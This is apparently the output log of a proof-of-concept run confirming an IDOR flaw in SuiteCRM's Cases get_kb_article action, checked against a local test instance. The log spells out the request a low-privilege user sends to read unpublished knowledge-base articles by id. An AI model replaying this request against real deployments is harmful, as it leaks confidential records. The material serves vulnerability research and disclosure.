@@ -1,0 +1,17 @@
+<frozen site>:107: RuntimeWarning: Unexpected value in sys.prefix, expected /opt/cvehunter/claude_audit/SuiteCRM/exploits/.venv, got /opt/cvehunter/claude_audit/SuiteCRM/exploits/VULN-032/../.venv
+<frozen site>:107: RuntimeWarning: Unexpected value in sys.exec_prefix, expected /opt/cvehunter/claude_audit/SuiteCRM/exploits/.venv, got /opt/cvehunter/claude_audit/SuiteCRM/exploits/VULN-032/../.venv
+========================================================================
+VULN-032: Cases get_kb_article reads any Knowledge Base article by id (IDOR)
+target: http://localhost:33116
+========================================================================
+[SETUP] admin web login
+[SETUP] as admin: create an unpublished (Draft) AOK_KnowledgeBase article
+[OK] KB article created: 764d40ff-9d15-4395-b3a7-b70531bdd4a9 name='V032KB-Internal-Runbook_5cea4a40' status=Draft (unpublished)
+[SETUP] provisioning a fresh low-priv attacker (never shown this article, never granted KB access)
+[INFO] attacker = mod_457b153f (96d0d8cf-77fe-40a4-b670-961da7a8d2ce)
+[STEP] as attacker: POST module=Cases&action=get_kb_article article=<kb_id>
+[PROOF] response status=200 len=231
+[PROOF] KB article title 'V032KB-Internal-Runbook_5cea4a40' leaked to attacker: True
+[PROOF] KB article (Draft) body 'CONFIDENTIAL body SECRETKBBODY032_6f98df72 -- escalation credentials go here' leaked to attacker: True
+[OK] attacker (no KB grant) read a Draft/unpublished article's full title + body by id
+==> VULN-032: CONFIRMED — attacker read unpublished KB article '764d40ff-9d15-4395-b3a7-b70531bdd4a9' ('V032KB-Internal-Runbook_5cea4a40') via Cases get_kb_article, no ACL check
